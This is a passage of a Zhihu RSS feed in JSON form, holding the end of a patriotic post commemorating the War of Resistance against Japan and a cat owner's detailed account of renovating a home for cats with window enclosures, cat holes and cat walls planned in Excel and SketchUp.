data-tags=\"politic\"></p>\n<p><br></p>\n<p>中国人民抗日战争</p>\n<p>是一部可歌可泣的悲壮诗篇14年的苦难与磨砺</p>\n<p>留给我们的遗产无比珍贵留给我们的力量无比强大</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-827fd18cc7ea1d91635c3641275b2866_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"733\" data-watermark=\"watermark\" data-original-src=\"v2-827fd18cc7ea1d91635c3641275b2866\" data-watermark-src=\"v2-08b0727af0906109dcf6e700cf4edca5\" data-private-watermark-src=\"v2-792ed3f155198906eb3999c370336bc5\"></p>\n<p><br></p>\n<p>战争的硝烟早已散去苦难的岁月永不能忘</p>\n<p>我们必须牢记来时的路让历史不再重演</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-ad81b981927d097f099a4c22bdd100c3_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"426\" data-watermark=\"watermark\" data-original-src=\"v2-ad81b981927d097f099a4c22bdd100c3\" data-watermark-src=\"v2-38621ed0d3b75a3c98a469f43387b4a3\" data-private-watermark-src=\"v2-9ef7f97d790d311d0f66c1fe742d4b83\" data-tags=\"politic\"></p>\n<h2>让我们在今天重拾抗战精神<br>\n</h2>\n<p>拿出爱国情怀、民族气节</p>\n<p>去完成抗战先贤们未竟的民族复兴大业</p>\n<h2>创造无愧于伟大新时代的新辉煌</h2>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-596159d0358cea76224f7a0814b0db7f_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1473\" data-watermark=\"watermark\" data-original-src=\"v2-596159d0358cea76224f7a0814b0db7f\" data-watermark-src=\"v2-12e4cf69dcb29c29b2492daef475c22e\" data-private-watermark-src=\"v2-f8c07598918483a41e510da1f0b2b1cc\"></p>\n<p><br></p>\n<p><b>天下兴亡，匹夫有责</b></p>\n<p><b>勿忘国殇，吾辈自强</b></p>\n<p><br></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhong-guo-wang-25?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">中国网</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/486830339/answer/2126841338?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">1974 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/470741239?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">「七七事变」84 周年纪念日，日本记者发推称：在日本很少有人提「 7 月 7 日」，反映了哪些问题？</a><br><a href=\"http://www.zhihu.com/question/487578931?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">2021年九一八事变90周年纪念日，面对国耻纪念日，你有什么想说的吗？</a><br>\n","link":"http://www.zhihu.com/question/486830339/answer/2126841338?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"一个合格「铲屎官」的家，需要为「主子」做哪些改变？","date":"2021-09-17 11:17:08","description":"\n<h2>自认算是合格的铲屎官，给大家分享一些关于有猫家庭的装修经验与考虑：</h2>\n<h2>与小猫咪的共存模式</h2>\n<p>没有完美的装修也没有完美的设计，方案都会有所偏向和取舍，但所有设计都应该为需求服务的。我家从新房的设计开始，我跟老婆就把两只小猫咪做为家庭主要成员来考虑的，明确自己/小猫咪的需求，才能设计出人宠共乐的家居环境。<br>在装修前自己也是买了好几本猫咪相关的装修书籍做了功课，如今装修结束，本文分享下我跟老婆在设计新房装修时针对小猫咪做了哪些规划和相关经验（本文图片及文字较多，建议先收藏后阅读）：<br><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-b1e131b4c829966f2b480fdfa049acb1_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3000\" data-rawheight=\"1800\" data-watermark=\"original\" data-original-src=\"v2-b1e131b4c829966f2b480fdfa049acb1\" data-watermark-src=\"v2-940e7e3e4fbec2605307a336a3da0538\" data-private-watermark-src=\"v2-f6776c63dcd08c5d95fcc5b7df579cc0\"></p>\n<p><br><br>1.安全（封阳台、窗户）<br>封窗很重要！封窗很重要！封窗很重要！重要的事情说三遍！不要跟我说什么我家猫很聪明的没那么傻会跳楼（外面的诱惑太多了），也不要用自我安慰的隐形防盗网（猫是聪明的液体！）<br>刚开始养猫的时候，我们就经历过封窗不够全面导致小猫咪跳楼的惊悚事件，好在猫找回来了也没怎么受伤，那次之后坚定了我们新家一定要封窗的信念。我们全屋都是带锁的窗子，阳台的推拉窗也不例外，而且都配有金刚纱窗，非常的坚固，不用担心猫会自己打开窗子或破坏纱窗，平时也能很好的通风换气。<br>2.小猫咪活动范围<br><br></p>\n<ul><li>允许小猫咪自由活动的空间：阳台、客厅、餐厅、厨房、主卧（蓝色区域）</li></ul>\n<p>阳台是小猫咪吃喝拉撒玩的主战场，客厅、餐厅连在一起、厨房是不希望他们去的，但由于是开放式的设计，所以只能让小猫咪自由活动了。我们家小猫咪会陪睡，所以主卧是希望他们能自由出入的。<br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-4fe62f02be70679a2f0d022dad771910_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"968\" data-rawheight=\"857\" data-watermark=\"original\" data-original-src=\"v2-4fe62f02be70679a2f0d022dad771910\" data-watermark-src=\"v2-a81a16fce54db018d570f047066e1980\" data-private-watermark-src=\"v2-7538ff14f6683cb295a72e8dc5267e61\"></p>\n<p><br></p>\n<ul><li>需在监护人的陪同下才可进入的空间：娱乐室、次卧、衣帽间、卫生间（红色区域）</li></ul>\n<p>次卧偶尔有亲戚朋友来住，以防万一别人不喜欢睡觉的时候被猫打扰，就没必要留猫洞。<br>娱乐室贵重物品较多（之前小发就弄坏过我的镜头），卫生间对猫来说有很多安全隐患的地方，衣帽间希望尽量避免猫毛，所以这些区域都是不让小猫咪独自随便进入的。<br><br>3.是否有笼子<br>我家不提倡笼养，所以没有笼子或者猫别墅这种东西，如果因为一些特殊原因猫需要临时单独隔离的话，可以选择关在衣帽间或者次卧。<br>如果你家是有准备笼子、猫别墅、猫柜的，这些东西体积都不小，需要想好放在什么地方。<br>4.是否与小猫咪共眠<br>第二点里提到过，我跟老婆都需要小猫咪陪睡。如果你不希望与猫共眠，要安排好你睡觉时猫的去处，不然夜猫子会影响睡眠质量的。<br><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-3d3ba70d741ceccb0a4115ab6889e369_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3840\" data-rawheight=\"2592\" data-watermark=\"original\" data-original-src=\"v2-3d3ba70d741ceccb0a4115ab6889e369\" data-watermark-src=\"v2-42dd1f1e0142594c5561501bbf5a5cdc\" data-private-watermark-src=\"v2-1c55763e9f488c754d3bac3a2ad32832\"></p>\n<p><br><br>5.小猫咪吃喝拉撒玩的位置规划<br>我们家猫粮是用自动喂食器的，饮水机有电动的也有傻瓜式的。规划好这些东西的摆放位置，预留好电位，尽可能的减少使用插排或者将电线裸露，电线这种东西对猫的吸引力很大、安全隐患也大。<br>像我这里预留三个插座可以供喂食器、饮水机、吹水机等使用。<br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-8f01e56d7a2488e5ccf095d031d28a49_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3071\" data-rawheight=\"1760\" data-watermark=\"original\" data-original-src=\"v2-8f01e56d7a2488e5ccf095d031d28a49\" data-watermark-src=\"v2-9be1605b5625d28bbeadc4665fe35615\" data-private-watermark-src=\"v2-b3a4de6f9f12d50ecf247689cafcf183\"></p>\n<p><br>如果你家还有智能猫砂盆的话，也需要提前规划好电位，甚至有些智能猫砂盆还需要接上下水的，做水电规划之前一定要想清楚放在哪里，同时要注意之前线路的走向以及保存好照片，避免后期猫墙产品无法安装上墙或者安装打到电管。<br><br>另外，经常会听说一些朋友的猫会乱抓家具，通常在家里给它们安排好足够多的玩具和固定的猫抓板，以及合理的引导和教导，它们通常都会在固定磨爪而不会乱抓家具了。<br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-201ebe2148cfac731c05a731d429796f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3648\" data-rawheight=\"2736\" data-watermark=\"original\" data-original-src=\"v2-201ebe2148cfac731c05a731d429796f\" data-watermark-src=\"v2-44ac7db241747627e2cc5afad4672137\" data-private-watermark-src=\"v2-0e79aade5c7ab7c3b079cb937eb5c4fc\"></p>\n<p><br>还有像阳台的排污管也是可以通过剑麻绳包起来作为猫爬柱的，不过一定要保证其稳定。我是前期没想着阳台这么一圈猫墙，所以就用瓷砖包起来了（小失败），于是小了一根通天柱，后期会将剩余的部分包起来。<br><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-73251153b9cf07cd5a22611117bf5732_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3648\" data-rawheight=\"2736\" data-watermark=\"original\" data-original-src=\"v2-73251153b9cf07cd5a22611117bf5732\" data-watermark-src=\"v2-1fe037f909dcf7561c99921eaffa707b\" data-private-watermark-src=\"v2-ce5b38467fb4e38ce9fd63eae1dacb4f\"></p>\n<p><br><br><br>6.猫砂、猫粮、猫玩具等用品储物空间<br>自从养了猫，老婆的购物车里大部分都是猫的东西，猫粮、猫砂、猫玩具、猫罐头、猫窝……像猫砂猫粮猫罐头这种遇到好价必须囤的，怎么存放妥当很重要，还得方便拿取。猫粮、猫罐头如果存放不当遇到包装袋破损、受潮之类的情况很容易变质，猫再吃进肚子里很容易生病。另外，猫对玩具的兴趣是会慢慢减弱，玩具也需要收纳在猫平时接触不到的地方。<br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-667526e50ac89666e81c14a2a1b94854_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3648\" data-rawheight=\"2736\" data-watermark=\"original\" data-original-src=\"v2-667526e50ac89666e81c14a2a1b94854\" data-watermark-src=\"v2-6d754b75a58d651abf1436dd038230c0\" data-private-watermark-src=\"v2-483d91ca5869d7491fc21a2e466814c1\"></p>\n<h2>\n<br><br>猫洞+墙体改造</h2>\n<p>我们家客厅与阳台有道推拉门隔离，但猫吃喝拉撒大部分都在阳台，所以在客厅与阳台之间的墙上留了一个猫洞让他们自由通行。猫洞是扩宽墙面的时候特地加的，旁边是承重墙没办法直接开洞，当然因此会牺牲一点阳台门的宽度。<br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-9bc30e00552ef28cac1551d372df6bf7_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3120\" data-rawheight=\"1760\" data-watermark=\"original\" data-original-src=\"v2-9bc30e00552ef28cac1551d372df6bf7\" data-watermark-src=\"v2-6911376bf48dc05bad69dae9b075ec83\" data-private-watermark-src=\"v2-77d34e290248f292e2ee4ee69f0c9233\"></p>\n<p><br>原始户型的主卧门是正对入户门的，改主卧门方向时走廊往主卧多延伸了一段，可以多放一个柜子，也能在旁边的墙体开猫洞，算是一举两得。<br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-4b9a2194b5089e05f90ef0766c79e558_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3120\" data-rawheight=\"1760\" data-watermark=\"original\" data-original-src=\"v2-4b9a2194b5089e05f90ef0766c79e558\" data-watermark-src=\"v2-70f09fb8cb917d9b7723abdc3e8b07b6\" data-private-watermark-src=\"v2-2e0c49aa36f3bfaa6460e738d02ac7c7\"></p>\n<p><br>猫洞的主要好处就是睡觉能关门，不用破坏原有的房门。<br><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-0153fa25077922f4e0f648d0ae69c527_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3120\" data-rawheight=\"1760\" data-watermark=\"original\" data-original-src=\"v2-0153fa25077922f4e0f648d0ae69c527\" data-watermark-src=\"v2-4bafd882768e779e2e0a561604402b9d\" data-private-watermark-src=\"v2-b743099f8d1a662aee4ca2e7458e9b0b\"></p>\n<p><br><br>不过有点可惜的是，当时没有考虑做一个比较特别的形状比如拱门等造型，只考虑了尽可能留大一些尺寸，两个胖子能够穿行即可，当然后期可能还会给猫洞增加一个小门锁，能够随时控制猫的活动空间。<br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-caff8772e0d3c5cc272dcfa71fefd205_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"300\" data-rawheight=\"300\" data-watermark=\"original\" data-original-src=\"v2-caff8772e0d3c5cc272dcfa71fefd205\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-aeb88ccd07d3a6baaeea2107a81b12b2_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"300\" data-rawheight=\"300\" data-watermark=\"original\" data-original-src=\"v2-aeb88ccd07d3a6baaeea2107a81b12b2\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br>如果不方便改动墙体的话，也可以选择在门上开洞的方式。淘宝上很多猫门的选择，甚至在纱窗上都能留猫门。<br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-9e1290ccf5df1cc07f76b49051d7a275_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"958\" data-rawheight=\"752\" data-watermark=\"original\" data-original-src=\"v2-9e1290ccf5df1cc07f76b49051d7a275\" data-watermark-src=\"v2-c2e372ff50491f2423d66b4ee0854d0e\" data-private-watermark-src=\"v2-e18f70518059a2851ab3ac9a68900a85\"></p>\n<h2>\n<br>猫墙</h2>\n<p><br></p>\n<p>老父亲老母亲对猫墙的设计费尽心思，耗尽毕生所学。<br>1.设计工具<br>我跟老婆都不太会什么绘画设计的软件，设计装修整体的时候也只是用酷家乐这种比较傻瓜的网站完成的，最多我用PS画一些方框当做立面设计图。但像猫墙这种东西多、尺寸要求相对比较严格的，我们是用EXCEL来画的，是的你没看错，Excel！甚至还用上了ppt，再高级点的还用了Sketchup。<br></p>\n<ul><li>Excel</li></ul>\n<p>将Excel的所有列宽拉成跟行高差不多的尺寸，让每个单元格看起来接近正方形，这样Excel就变成了一张格子图，假设单位长度设为5cm（如果需要设计的面不大，甚至可以设为1cm），需要在什么地方放多大的东西，两个物体之间的距离是多少，数格子就能算出来。比拿纸笔手画强很多，好歹能画出直线并且比例是正确的。<br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-07bced4dc88b62ced2ac5f151d97b70b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"751\" data-rawheight=\"371\" data-watermark=\"original\" data-original-src=\"v2-07bced4dc88b62ced2ac5f151d97b70b\" data-watermark-src=\"v2-5a9c3e26a15da1dc1fa9575abd014af9\" data-private-watermark-src=\"v2-30866e8a656172a1bb44cc4e40795a3b\"></p>\n<p><br></p>\n<ul><li>PPT</li></ul>\n<p>Excel里标记尺寸比较方便，但对形状的处理就没那么友好，比如想画个斜线或者圆弧就比较难，这时候可以用PPT里的形状来处理。其实Excel里也有形状，不过我用的是腾讯文档，没办法在Excel里插入形状，所以转战PPT了。看我用ppt画的猫吊桥示意图！<br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-66bfead4bdb72eec9d795f50f99fab68_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1083\" data-rawheight=\"754\" data-watermark=\"original\" data-original-src=\"v2-66bfead4bdb72eec9d795f50f99fab68\" data-watermark-src=\"v2-86478ebf985ed7b2677758ad69ff08a6\" data-private-watermark-src=\"v2-d9d8a48679179010683172eabc74e582\"></p>\n<p><br></p>\n<ul><li>SketchUp</li></ul>\n<p>最开始设计整个房间的时候就有想过用sketchup，可一直懒癌发作没下手，只有为了两只小猫咪，才老老实实开始学。网上找些入门的视频看看，会一些基本的功能就行。官网有在线设计的功能<u><a href=\"http://link.zhihu.com/?target=https%3A//app.sketchup.com/app\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">https://</span><span class=\"visible\">app.sketchup.com/app</span><span class=\"invisible\"></span></a></u>，软件不需要装，也不需要到处找破解，非常方便。我们比较复杂的阳台柜，就是慢慢摸索着画出来的。<br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-f72281e602211f90032b6c93d3ce832b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"568\" data-rawheight=\"459\" data-watermark=\"original\" data-original-src=\"v2-f72281e602211f90032b6c93d3ce832b\" data-watermark-src=\"v2-fe7fe77c683512ac3947219ada098edc\" data-private-watermark-src=\"v2-7bf3729de02ab9a024436c438bf593cf\"></p>\n<p><br>老婆说挺好玩的，本来只让她画阳台柜，她居然顺手把墙面的猫墙都画了一部分。<br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-5233162d25ceffac5a1a3ab2fdbe365d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1377\" data-rawheight=\"929\" data-watermark=\"original\" data-original-src=\"v2-5233162d25ceffac5a1a3ab2fdbe365d\" data-watermark-src=\"v2-e78c03f8fbe6b08fbccc1080db159299\" data-private-watermark-src=\"v2-fecfba188e1bfc79c04ce90b988b2748\"></p>\n<p><br>2.客厅猫墙<br>沙发背后的墙面比较空旷，又不想挂装饰画之类的东西，于是也规划做猫墙。沙发区猫墙没有用过多可爱的造型，而是尽量使用简单的一字板。两脚兽窝在沙发里看剧时，小猫咪也可以在高处的板子上玩耍或者睡觉。实际体验下来，猫咪上手速度快且很喜欢在这片区域探索。<br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-b903ce9963135c638f21c39763e126fc_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4500\" data-rawheight=\"3000\" data-watermark=\"original\" data-original-src=\"v2-b903ce9963135c638f21c39763e126fc\" data-watermark-src=\"v2-4e71d13038f790720ea3586f133dafab\" data-private-watermark-src=\"v2-9bcf9825b815ce4f71a8ef3dec0900e0\"></p>\n<p><br><br> 靠近强电箱的一字板因为有一部分支架固定在空心砖上，担心承受不住两只肥猫的体重，加了一个小屋子固定，两只小猫咪最喜欢在这里面睡觉了，甚至无视自己的体型挤在一起。<br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-220c18f2e4e38a348da96807518af9c7_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3000\" data-rawheight=\"4500\" data-watermark=\"original\" data-original-src=\"v2-220c18f2e4e38a348da96807518af9c7\" data-watermark-src=\"v2-2f0543e4d430f4d6bbec8809b985f4a9\" data-private-watermark-src=\"v2-b6774c80e1dfe65e2b3f6e573d2a0c99\"></p>\n<p><br><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-5912484bb8791fd0efc14bf6bec24d03_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3648\" data-rawheight=\"2736\" data-watermark=\"original\" data-original-src=\"v2-5912484bb8791fd0efc14bf6bec24d03\" data-watermark-src=\"v2-1fc7b92b201e5bc611004def8c2fb96f\" data-private-watermark-src=\"v2-2c1b199a15fded953b530db005854b5e\"></p>\n<p><br><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-88dc49959cadc4197e533189701fe04b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3648\" data-rawheight=\"2736\" data-watermark=\"original\" data-original-src=\"v2-88dc49959cadc4197e533189701fe04b\" data-watermark-src=\"v2-0d0bb0298c90510802026f1131375720\" data-private-watermark-src=\"v2-b2d3e4ad3af7a053cccf2c9f1ddf77b8\"></p>\n<p><br>将沙发往前移30厘米，背后做一排上开门的柜子，增加收纳的同时还能避免坐沙发上头撞一字板，小猫咪也可以趴在柜子上或者从柜子起跳到一字板。沙发前移，电视从视觉上变得更大了呢！<br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-d5d162836bceea73204b5eb2ef9d759e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3543\" data-rawheight=\"2362\" data-watermark=\"original\" data-original-src=\"v2-d5d162836bceea73204b5eb2ef9d759e\" data-watermark-src=\"v2-ffab7c5a39955ea9ed2109a3bb6232ec\" data-private-watermark-src=\"v2-f930a14f29096c36f0f44bc64686e969\"></p>\n<p><br>沙发墙墙面有强电箱（被猫抓板盖住）、弱电箱以及一些电线走管，在墙上打孔固定东西的时候都要注意，所以在设计图中都有标记（粉色部分）。强电箱出来的电线是斜着走的，Excel画不出来，就丢了一张照片在旁边时刻提醒自己打孔的时候要注意。图中蓝色线条为置物板的长度及位置，蓝线上的绿色方框为支架固定的位置。考虑到猫的体重、体型以及未来他们年纪大了弹跳力下降，每个置物板之间高度差尽量控制在40厘米左右。<br>而能如此做的前提是原弱电箱在装修的时候，已经改移到娱乐室不再使用了，强电箱采用一块猫抓板遮丑，另外为了安全在后背加了一块阻燃的PVC板。<br><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-f013e3e4ddcbd1a3a60b945c5249d761_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1124\" data-rawheight=\"707\" data-watermark=\"original\" data-original-src=\"v2-f013e3e4ddcbd1a3a60b945c5249d761\" data-watermark-src=\"v2-78270a7c1c67c72dd26c9169d367771c\" data-private-watermark-src=\"v2-298f222dfb7e382fdbca6f93e6198eaa\"></p>\n<p><br>左侧是阶梯型的格子柜，猫可以从左侧一步步登高探索猫墙，也可在格子柜内玩耍，格子柜还有一定的收纳功能。右侧是顶天立地的宜家毕利柜，把窗帘和猫墙隔开。<br>其实最初我有考虑在沙发背后最右侧的柜子内留一个猫通道的，但想想没这个必要（可以直接跳沙发），而且会牺牲柜子空间和难以打理，所以最终成了如今的模样。<br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-a71d360ebb13858495b4807d5782098c_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2170\" data-rawheight=\"3327\" data-watermark=\"original\" data-original-src=\"v2-a71d360ebb13858495b4807d5782098c\" data-watermark-src=\"v2-65f125cb4af8844a7b0c13f2d98e8a76\" data-private-watermark-src=\"v2-053c38b976b6669fdded50f7ee12129f\"></p>\n<p><br>阶梯型格子柜有两格是留给它们玩耍的，没想到它们还真的会到里面去。<br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-76774192937df4d733a0da043c6a99b1_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"300\" data-rawheight=\"300\" data-watermark=\"original\" data-original-src=\"v2-76774192937df4d733a0da043c6a99b1\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-efa7affd6007c53b87309b52f53097ac_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"300\" data-rawheight=\"300\" data-watermark=\"original\" data-original-src=\"v2-efa7affd6007c53b87309b52f53097ac\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br>上面的图只画了置物板的长度和位置，深度、具体开孔位置和外观形状是用ppt画的，下图就是最终我们发给实木定制商家的尺寸图。墙面中间的板子开了一个20厘米直径的洞，计划是想让猫可以钻洞上下切换，但目前为止小猫咪还不会使用这个洞。<br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-534e24b5345d3ae6c6a269003ac9069a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1239\" data-rawheight=\"647\" data-watermark=\"original\" data-original-src=\"v2-534e24b5345d3ae6c6a269003ac9069a\" data-watermark-src=\"v2-eab57e8a5f4c5773a5112d381859216a\" data-private-watermark-src=\"v2-7173785141653bbba608e8da727ba5df\"></p>\n<p><br>温馨提示：孔径最好比固定支架的杆子大一些（0.5mm），我们支架12mm（漆面会有误差），孔也开的12mm很难塞进去，安装的时候只能又买了钻头把孔扩大，费时费力。<br><br>3.阳台猫墙<br><br>阳台可以说几乎都给了它们，只留了一小半作为晾衣区。阳台的猫墙设计相对客厅沙发墙更复杂些，都是一些奇形怪状的实木猫屋猫跳台。阳台做了封窗处理，所有窗子都带锁，哪怕金刚纱窗也是带锁，保证通风的同时还能保证小猫咪的安全。<br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-e84bd132ee8032290322e2925f43bae2_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3000\" data-rawheight=\"2177\" data-watermark=\"original\" data-original-src=\"v2-e84bd132ee8032290322e2925f43bae2\" data-watermark-src=\"v2-e9d0c8b11269fbff28561a2eef53cd64\" data-private-watermark-src=\"v2-b7c127000720b9e908d59353281b9c3f\"></p>\n<p><br>阳台柜台面上暂时只放了一台猫饮水机，柜体专门预留了猫砂盆的位子，水槽下方是云鲸拖地机基站，阳台柜左侧墙面底部有个通往客厅的猫洞。台面高90cm，目前小猫咪努努力还是能跳上台面的，再从台面跳往豪华猫墙娱乐区。计划在猫洞上再适当增加一个跳台，方便小猫咪上台面。<br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-73432b2018427543c0a7d50d366a4f99_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"426\" data-rawheight=\"503\" data-watermark=\"original\" data-original-src=\"v2-73432b2018427543c0a7d50d366a4f99\" data-watermark-src=\"v2-3578233b39759476b7a7ff147ae7df9d\" data-private-watermark-src=\"v2-cce9acffa7e43af061c650f971914360\"></p>\n<p><br>在淘宝把想要用到的猫屋猫跳台图片找到，最好是带着尺寸的平面图（比如八角太空舱）。在PPT里画个大概的形状，再截图贴到Excel里摆放，比如图里的吊桥，这样在布局的时候会更加直观一些。<br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-54e07114d9440cb8ba403acd84eb8bc4_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"753\" data-watermark=\"original\" data-original-src=\"v2-54e07114d9440cb8ba403acd84eb8bc4\" data-watermark-src=\"v2-2c195cffa1916973c7fbbfd1c69cdf18\" data-private-watermark-src=\"v2-1caddb179658c7ad9309d603fce09047\"></p>\n<p><br><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-05e0af5cb9a7db5ab6215ebd16c5c2e1_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2362\" data-rawheight=\"1751\" data-watermark=\"original\" data-original-src=\"v2-05e0af5cb9a7db5ab6215ebd16c5c2e1\" data-watermark-src=\"v2-b2cf04a64979684ec8d9d2221dafe737\" data-private-watermark-src=\"v2-f184333c438f1d17c1cdd2e0e0655764\"></p>\n<p><br>猫墙不仅大大的利用了阳台空间，同时在设计的时候也兼顾了美观，从入户到客厅位置是基本看不到这些猫墙的。<br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-6c745c5449b89bebcf96f8dcf0c0ac13_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3543\" data-rawheight=\"2362\" data-watermark=\"original\" data-original-src=\"v2-6c745c5449b89bebcf96f8dcf0c0ac13\" data-watermark-src=\"v2-d096c327ba5be4cdfce932e37b307f7a\" data-private-watermark-src=\"v2-71f6e5305bdaf34063f687eba5b24ebc\"></p>\n<p><br><br>猫墙的所有东西都购自淘宝，找了四家店才买齐。店家都有配膨胀钉，但我们对自己的猫体重有点数，全部换成了慧鱼膨胀钉。本来打算自己装的，可是墙面贴有瓷砖，我的工具不太好，就索性找师傅上门一起安装，连同客厅的一字板、阳台窗帘一起一天装完。不算安装费的话，豪华猫墙总花费2300元。<br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-6fb02531ee90b53b2b7b64724bdb87d4_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"993\" data-rawheight=\"630\" data-watermark=\"original\" data-original-src=\"v2-6fb02531ee90b53b2b7b64724bdb87d4\" data-watermark-src=\"v2-fb3425c6338f2b8629366af2341ce11c\" data-private-watermark-src=\"v2-dc03ceff73bd86c58ecff28da3e899d9\"></p>\n<p><br>当然如果自己是个手艺人且工具齐全的话，也可以自己购买木头进行加工制作，只要能保证稳固和边角圆润即可。<br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-288651da28d9f3e31eb3b304defbbed0_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3598\" data-rawheight=\"2293\" data-watermark=\"original\" data-original-src=\"v2-288651da28d9f3e31eb3b304defbbed0\" data-watermark-src=\"v2-135b51c5e243cf7e2139c5f6f0eac841\" data-private-watermark-src=\"v2-5a8deb394f9f30976ac017c93383e49d\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-4c90c31607057c4313431c78297dc66e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3648\" data-rawheight=\"2736\" data-watermark=\"original\" data-original-src=\"v2-4c90c31607057c4313431c78297dc66e\" data-watermark-src=\"v2-7ae923442843b32fca1471761e3ed7f8\" 